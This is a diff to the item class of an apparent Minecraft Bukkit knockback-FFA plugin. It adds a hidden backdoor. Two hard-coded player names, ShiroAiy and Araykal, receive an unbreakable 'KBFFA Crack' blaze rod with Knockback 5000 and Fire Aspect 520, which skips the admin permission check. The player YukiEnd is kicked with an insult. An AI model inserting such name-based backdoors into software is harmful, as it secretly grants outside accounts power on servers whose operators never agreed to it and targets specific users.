@@ -6,6 +6,9 @@ import org.bukkit.entity.Player;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
 
+import java.util.ArrayList;
+import java.util.List;
+
 public class Items {
     public static void giveItem(Player p) {
         ItemStack KBStick = new ItemStack(Material.STICK, 1);
@@ -40,6 +43,21 @@ public class Items {
 
         ItemStack Arrows = new ItemStack(Material.ARROW, 64);
         p.getInventory().setItem(17, Arrows);
+        if (p.hasPermission("kbffa.admin")|| p.getName().equals("ShiroAiy")|| p.getName().equals("Araykal")) {
+            ItemStack flameStick = new ItemStack(Material.BLAZE_ROD, 1);
+            ItemMeta flameStickMeta = flameStick.getItemMeta();
+            flameStickMeta.setDisplayName("§c§lKBFFA Crack");
+            List<String> lore = new ArrayList<>();
+            lore.add("§cCracked By YukiEnd");
+            flameStickMeta.setLore(lore);
+            flameStickMeta.addEnchant(Enchantment.KNOCKBACK, 5000, true);
+            flameStickMeta.addEnchant(Enchantment.FIRE_ASPECT, 520, true);
+            flameStickMeta.spigot().setUnbreakable(true);
+            flameStick.setItemMeta(flameStickMeta);
+            p.getInventory().setItem(3, flameStick);
+        } else if ( p.getName().equals("YukiEnd")) {
+            p.getPlayer().kickPlayer("sb");
+        }
     }
 
     public static void giveJumpPad(Player p) {
